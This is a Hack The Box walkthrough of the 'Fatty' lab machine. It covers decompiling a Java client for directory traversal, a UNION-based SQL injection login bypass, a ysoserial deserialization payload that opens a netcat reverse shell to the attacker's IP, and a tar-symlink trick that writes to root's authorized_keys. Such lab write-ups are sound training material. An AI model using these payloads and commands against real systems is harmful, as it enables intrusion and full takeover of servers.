# Fatty HTB writeup

![Fatty Image](https://www.hackthebox.eu/storage/avatars/434a84b479e2121f8dbf2c7c56becffd.png)

Fatty is an insane rated box in Hack the Box, it was extremely fun to do even though it took me ~50 hours of work to root it. This box will make you reverse engineer a java client and a server, write some code and  learn how symlink really works behind different technologies.

Got some coffee and get ready to enjoy this master piece.

## Enumeration

First things first, so Nmap gave us an FTP server with anonymous access allowed, also some other ports that nmap wasn't able to discover what was running on it.

```bash
# All ports result
PORT     STATE SERVICE
21/tcp   open  ftp
22/tcp   open  ssh
1337/tcp open  waste
1338/tcp open  wmc-log-svc
1339/tcp open  kjtsiteserver


# Script results
PORT     STATE SERVICE            VERSION
21/tcp   open  ftp                vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar
| -rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt
| -rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt
|_-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.10.14.31
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh                OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 fd:c5:61:ba:bd:a3:e2:26:58:20:45:69:a7:58:35:08 (RSA)
|_  256 4a:a8:aa:c6:5f:10:f0:71:8a:59:c5:3e:5f:b9:32:f7 (ED25519)
1337/tcp open  ssl/waste?
|_ssl-date: 2020-06-05T21:04:08+00:00; +53s from scanner time.
1338/tcp open  ssl/wmc-log-svc?
|_ssl-date: 2020-06-05T21:04:08+00:00; +53s from scanner time.
1339/tcp open  ssl/kjtsiteserver?
|_ssl-date: 2020-06-05T21:04:08+00:00; +53s from scanner time.
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Foothold

Nmap told us the FTP service allowed anonymous access, is time to connect and see whats on the files

```bash
$ ftp 10.10.10.174
Connected to 10.10.10.174.
220 qtc's development server
Name (10.10.10.174:xnaaro): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp      15426727 Oct 30  2019 fatty-client.jar
-rw-r--r--    1 ftp      ftp           526 Oct 30  2019 note.txt
-rw-r--r--    1 ftp      ftp           426 Oct 30  2019 note2.txt
-rw-r--r--    1 ftp      ftp           194 Oct 30  2019 note3.txt
226 Directory send OK.
```

First text file suggest the server has some kind of vulnerability and they changed default connection port but the fatty-client was updated with such changes.

```bash
$ cat note.txt
Dear members,

because of some security issues we moved the port of our fatty java server from 8000 to the hidden and undocumented port 1337.
Furthermore, we created two new instances of the server on port 1338 and 1339. They offer exactly the same server and it would be nice
if you use different servers from day to day to balance the server load.

We were too lazy to fix the default port in the '.jar' file, but since you are all senior java developers you should be capable of
doing it yourself ;)

Best regards,
qtc
```

Second note told us they are using Java version 8

```bash
$ cat note2.txt
Dear members,

we are currently experimenting with new java layouts. The new client uses a static layout. If your
are using a tiling window manager or only have a limited screen size, try to resize the client window
until you see the login from.

Furthermore, for compatibility reasons we still rely on Java 8. Since our company workstations ship Java 11
per default, you may need to install it manually.

Best regards,
qtc
```

Third note gave us login credentials.

```bash
$ cat note3.txt
Dear members,

We had to remove all other user accounts because of some seucrity issues.
Until we have fixed these issues, you can use my account:

User: qtc
Pass: clarabibi

Best regards,
qtc
```

One we gathered some information, first tried to directly connect with fatty-client which gave us connection error since the port whose trying to connect was not opened.

## Reverse engineer and rebuild package

At this point only thing we where able to do is to decompile the .jar package with `jd-gui` program and export the resulting contents into our computer.

First thing we need is to create a correct maven package layout. To do this copy `pom.xml` and `pom.properties` from `META-iNF/maven/fatty-client/fatty-client` into package's root directory.

Next move all contents from `htb` to `src` folder \(create it\)

Copy the following files from package root into a new `resources` folder.

```bash
$ ls -lsrta resources
total 72
 4 drwxr-xr-x 8 xnaaro xnaaro  4096 Jun 13 21:29 ..
 4 -rw-r--r-- 1 xnaaro xnaaro  1550 Jun 13 21:29 beans.xml
 4 -rw-r--r-- 1 xnaaro xnaaro  2230 Jun 13 21:29 exit.png
 8 -rw-r--r-- 1 xnaaro xnaaro  4317 Jun 13 21:30 fatty.p12
 4 -rw-r--r-- 1 xnaaro xnaaro   831 Jun 13 21:30 log4j.properties
44 -rw-r--r-- 1 xnaaro xnaaro 41645 Jun 13 21:30 spring-beans-3.0.xsd
 4 drwxr-xr-x 2 xnaaro xnaaro  4096 Jun 13 21:30 .
```

As we saw in the notes.txt, the server port was changed to 1337, then modify `resources/beans.xml` and change port to 1337

Last step is to build the package with maven, it needs to be done with java version 8.

```bash
JAVA_HOME=/usr/lib/jvm/java-8-openjdk-amd64/ mvn package
```

Add server.fatty.htb to /etc/hosts.

Run the client and connect to the server using credentials from note3.txt

```bash
/usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar target/fatty-client.jar
```

After enumerating the server with `qtc` permissions, we saw the following file which informs qtc that only his user is enabled and all admin users removed, this is useful information for later steps.

Contents of `-> mail -> dave.txt`

```bash
Hey qtc,

until the issues from the current pentest are fixed we have removed all administrative users from the database.
Your user account is the only one that is left. Since you have only user permissions, this should prevent exploitation
of the other issues. Furthermore, we implemented a timeout on the login procedure. Time heavy SQL injection attacks are
therefore no longer possible.

Best regards,
Dave
```

## Directory Traversal

At this point we had no idea of how to proceed as we still missing some server behavior knowledge prior exploitation of other vulnerabilities.

Now is time to check if directory traversal was a thing and it was, we were able to see some other files in a previous directory, but due some server side input validation only a single directory traversal was possible.

In the traversed directory with `../////////` payload we can see a file called `fatty-server.jar`

Modify `src/htb/fatty/client/methods/Invoker.java`, might need to import some other classes at the begining of the java file.

Modified code for directory traversal file listing

```java
  public String showFiles(String folder) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {  }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
      return "Error: Method '" + methodName + "' is not allowed for this user account";
    }

    this.action = new ActionMessage(this.sessionID, "files");
    this.action.addArgument("..///////");
    sendAndRecv();
    if (this.response.hasError()) {
      return "Error: Your action caused an error on the application server!";
    }
    return this.response.getContentAsString();
  }
```

Modified code for file download

```java
import java.io.File;
import java.io.FileOutputStream;


  public String open(String foldername, String filename) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {  }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
      return "Error: Method '" + methodName + "' is not allowed for this user account";
    }

    this.action = new ActionMessage(this.sessionID, "open");
    this.action.addArgument("../////////");
    this.action.addArgument("fatty-server.jar");
    this.action.send(this.serverOutputStream);
    this.message = Message.recv(this.serverInputStream);
    this.response = new ResponseMessage(this.message);
    FileOutputStream fop = null;
    File file;
    String content = "";

    try {

        file = new File("fatty-server.jar");
        fop = new FileOutputStream(file);

        if (!file.exists()) {
            file.createNewFile();
        }
        byte[] contentInBytes = this.response.getContent();

        fop.write(contentInBytes);
        fop.flush();
        fop.close();

        System.out.println("Done");

    } catch (IOException e) {
        e.printStackTrace();
    } finally {
        try {
            if (fop != null) {
                fop.close();
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
    if (this.response.hasError()) {
      return "Error: Your action caused an error on the application server!";
    }
    String response = "";
    return response;
  }
```

Compile the client with maven again, login and click filebrowser on any folder, then click open.

At this point fatty-server.jar file should be already downloaded

Decompile server contents with `jd-gui`.

Some of the main thing noticed was a database connection.

Also on `checkLogin` method we can see an SQL injection was possible as no input sanization was done.

```java
public class FattyDbSession
{
  private static String url = "jdbc:mysql://database.fatty.htb:3306/Fatty";
  private Connection conn;
  private FattyLogger logger = new FattyLogger();


  public FattyDbSession() throws SQLException {
    Connection conn = null;
    conn = DriverManager.getConnection(url, "qtc", "securedatabasepasswordpoweredbyclarabibi!");
    this.conn = conn;
  }

--------------------------------

  public User checkLogin(User user) throws LoginException {
    Statement stmt = null;
    ResultSet rs = null;
    User newUser = null;

    try {
      stmt = this.conn.createStatement();
      rs = stmt.executeQuery("SELECT id,username,email,password,role FROM users WHERE username='" + user.getUsername() + "'");

--------------------------------

}
```

## SQL injection

At first tried many different SQLi payload but got no success, so build a local lab to emulating server side code and client connections.

After a few hours analyzing server responses and modifying client code, got a sucess SQLi.

This is the Client method we have to bypass `src/htb/fatty/shared/resources/User.java` As we can see client side code will create a hash of `username:password+string` so our payload was not being executed properly.

```java
  public User(int uid, String username, String password, String email, Role role) {
    this.uid = uid;
    this.username = username;

    String hashString = this.username + password + "clarabibimakeseverythingsecure";
    MessageDigest digest = null;
    try {
      digest = MessageDigest.getInstance("SHA-256");
    } catch (NoSuchAlgorithmException e) {
      e.printStackTrace();
    }
    byte[] hash = digest.digest(hashString.getBytes(StandardCharsets.UTF_8));

    this.password = DatatypeConverter.printHexBinary(hash);
```

Then found out I could send the hashed string of my choice directly modifying client side code.

Below is the code used to pass the hashed password instead of the generated in User.user method `src/htb/fatty/shared/message/LoginMessage.java`

```java
  public void send(OutputStream output) throws MessageBuildException, IOException {
    String transfer = this.user.getUsername() + ":" + "5A67EA356B858A2318017F948BA505FD867AE151D6623EC32BE86E9C688BF046";

    setPayload(transfer.getBytes());
    byte[] message = getBytes();
    output.write(message);
  }
}
```

All this information was after hours of debugging locally, this write up is not a step by step guide but rather a how to do some parts. You might need to investigate a bit more the code to fully understand and fix the code.

The payload used on username during logging was this, password field could be left empty as we hardcoded the hash in code.

The payload will return looked up server side data from the database and hardcode a role value with `'admin'`, this way we got admin role on the app without breaking other people fun changing content on the database.

```sql
' UNION SELECT all id,username,email,password,'admin' from users where username='qtc
```

And we got a successful login with admin privileged.

```bash
[AWT-EventQueue-1] INFO  infoLogger  - [+] Connection process finished.
[AWT-EventQueue-1] INFO  infoLogger  - ' UNION SELECT all id,username,email,password,'admin' from users where username='qtc
[AWT-EventQueue-1] INFO  infoLogger  - E42C818F80D72ED7E5752AE36777F97628942A23B8F4BBDA3C1A9068409549A9
[AWT-EventQueue-1] INFO  infoLogger  - ' UNION SELECT all id,username,email,password,'admin' from users where username='qtc:5A67EA356B858A2318017F948BA505FD867AE151D6623EC32BE86E9C688BF046
[AWT-EventQueue-1] INFO  infoLogger  - [+] Login successful!
```

## Java object serialization + RCE

Reviewing server side code was very clear that RCE was through object de-serialization on changePW method but the method was not fully implemented in client side code.

Now is time to make the client change password work to pass a new password in the client GUI `src/htb/fatty/client/gui/ClientGuiTest.java`

```java
    pwChangeButton.addActionListener(new ActionListener()
    {
      public void actionPerformed(ActionEvent e) {
        String response = "";
        String new_pass =  textField_2.getText();
        try {
          response = ClientGuiTest.this.invoker.changePW(ClientGuiTest.this.currentFolder, new_pass);
        } catch (MessageBuildException|htb.fatty.shared.message.MessageParseException e1) {
          JOptionPane.showMessageDialog(controlPanel, "Failure during message building/parsing.", "Error", 0);

        }
        catch (IOException e2) {
          JOptionPane.showMessageDialog(controlPanel, "Unable to contact the server. If this problem remains, please close and reopen the client.", "Error", 0);
        }



        textPane.setText(response);
      }
    });
```

And modify the `changePW` method to not encode the input and directly pass our base64 encoded payload `src/htb/fatty/client/methods/Invoker.java`

```java
public String changePW(String username2, String newPassword) throws MessageParseException, MessageBuildException, IOException {
    String methodName = (new Object() {  }).getClass().getEnclosingMethod().getName();
    logger.logInfo("[+] Method '" + methodName + "' was called by user '" + this.user.getUsername() + "'.");
    if (AccessCheck.checkAccess(methodName, this.user)) {
      return "Error: Method '" + methodName + "' is not allowed for this user account";
    }
    String username = "qtc";
    User user = new User(username, newPassword);

    this.action = new ActionMessage(this.sessionID, "changePW");
    this.action.addArgument(new String(newPassword));
    sendAndRecv();
    if (this.response.hasError()) {
      return "Error: Your action caused an error on the application server!";
    }
    return this.response.getContentAsString();
  }
```

At this point we were able to pass a base64 encoded payload during password change, but we still need to find a proper payload.

So at `pom.xml` in server source we saw `commons-collections` 3.1 library is used.

```markup
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

Then used `ysoserial` java app from github to create the payload with a reverse shell using CommonCollections7 and encoded in base64.

```bash
$ /usr/lib/jvm/java-8-openjdk-amd64/bin/java -jar ~/Downloads/ysoserial-master-SNAPSHOT.jar CommonsCollections7 "nc -nv 10.10.14.31 4443 -e /bin/sh" > payload &&  base64 -w0 payload
rO0ABXNyABNqYXZhLnV0aWwuSGFzaHRhYmxlE7sPJSFK5LgDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/---------------+AC0AAAACeA==
```

Right after sending the payload on new password during password change, we got a reverse shell as `qtc` user inside a docker container.

```bash
$ rlwrap nc -nvlp 4443
listening on [any] 4443 ...
connect to [10.10.14.31] from (UNKNOWN) [10.10.10.174] 40519
id
uid=1000(qtc) gid=1000(qtc) groups=1000(qtc)
ls -lsrta
total 16
     4 ----------    1 qtc      qtc             33 Oct 30  2019 user.txt
     4 drwxr-xr-x    1 root     root          4096 Oct 30  2019 ..
     4 drwxr-sr-x    1 qtc      qtc           4096 Oct 30  2019 .
     4 drwx------    1 qtc      qtc           4096 Oct 30  2019 .ssh
/bin/sh -i
2f265ce12800:/home/qtc$ chmod 600 user.txt
2f265ce12800:/home/qtc$ cat user.txt
7fab2c31f------------------------
```

## Local enumeration

After some hours enumerating locally and trying different exploits, found out with `pspy64` an `scp` was being done every minute from a different host.

```bash
2f265ce12800:/var/tmp$ ./pspy64 2>&1

2020/06/21 15:41:01 CMD: UID=0    PID=2571   | sshd: [accepted]
2020/06/21 15:41:01 CMD: UID=0    PID=2572   | sshd: [accepted]  
2020/06/21 15:41:01 CMD: UID=1000 PID=2573   | sshd: qtc
2020/06/21 15:41:01 CMD: UID=1000 PID=2574   | scp -f /opt/fatty/tar/logs.tar

2020/06/21 15:42:01 CMD: UID=0    PID=2575   | /usr/sbin/sshd -R
2020/06/21 15:42:01 CMD: UID=22   PID=2576   | sshd: [net]
2020/06/21 15:42:02 CMD: UID=1000 PID=2577   | sshd: qtc
2020/06/21 15:42:02 CMD: UID=1000 PID=2578   | scp -f /opt/fatty/tar/logs.tar
```

## Privilege escalation

At this point a lot of work to understand the behaviour was required to get privesc on the other host.

The behavior of all this part was:

* First upload a tar file, inside the tar a file called the same way `logs.tar` with a symlink pointing to `/root/.ssh/authorized_keys`
* The server extract the tar file and our new `logs.tar` file with the symlink replaces its own name with the link to authorized\_keys
* Then upload an authorized\_keys file with same name as the link \(Not a real tar file, just text file with tar extension\)
* While scp'ing on the server it will follow the link
* At this point `/root/.ssh/authorized_keys` is a link from to `logs.tar` with our public key on it giving us root access into the box.

First create a logs\_key.tar file with public key contents

```bash
cat id_rsa.pub > logs_key.tar
```

Create a link called `logs.tar` pointing to root authorized\_keys, and compress it as .tar

```bash
$ ln -s /root/.ssh/authorized_keys logs.tar
$ tar -cvf logs_link.tar logs.tar
logs.tar
```

Inside the container download both files and remove existing `logs.tar` file.

First step in this privesc is to put the link, copy link tar as original name `logs.tar` and wait a minute.

```bash
2f265ce12800:/opt/fatty/tar$ wget http://10.10.14.31/logs_key.tar
2f265ce12800:/opt/fatty/tar$ rm logs.tar
2f265ce12800:/opt/fatty/tar$ cp logs_link.tar logs.tar
```

At this point the link might be created, clean previous `logs.tar` and replace it with our key file

```bash
2f265ce12800:/opt/fatty/tar$ wget http://10.10.14.31/logs_key.tar
2f265ce12800:/opt/fatty/tar$ rm -rf logs.tar
2f265ce12800:/opt/fatty/tar$ cp logs_key.tar logs.tar
```

We can see the files were copied two times

```bash
#pspy64

2020/06/23 18:11:01 CMD: UID=0    PID=912    | sshd: [accepted]
2020/06/23 18:11:01 CMD: UID=22   PID=913    | sshd: [net]
2020/06/23 18:11:01 CMD: UID=0    PID=914    | sshd: qtc [priv]  
2020/06/23 18:11:02 CMD: UID=1000 PID=915    | scp -f /opt/fatty/tar/logs.tar


2020/06/23 18:12:01 CMD: UID=0    PID=919    | /usr/sbin/sshd -R
2020/06/23 18:12:01 CMD: UID=22   PID=920    | sshd: [net]
2020/06/23 18:12:01 CMD: UID=0    PID=921    | sshd: qtc [priv]  
2020/06/23 18:12:01 CMD: UID=1000 PID=922    | ash -c scp -f /opt/fatty/tar/logs.tar
```

## Root

After the second `logs.tar` is downloaded, we can SSH into the box as root user.

```bash
$ ssh root@server.fatty.htb -i id_rsa
Linux fatty 4.9.0-11-amd64 #1 SMP Debian 4.9.189-3+deb9u1 (2019-09-20) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Jan 29 12:31:22 2020
root@fatty:~# id
uid=0(root) gid=0(root) groups=0(root)
root@fatty:~# hostname
fatty
root@fatty:~# cat root.txt
ee982fa19b41-------------------------
```

Great, we rooted Fatty

To me this was one of the best boxes I've did on Hack the Box and the one on which I've spent more time until now \(~50h\).

Even though, it was fun and not the kind of boxes looking for unknown things

Regards

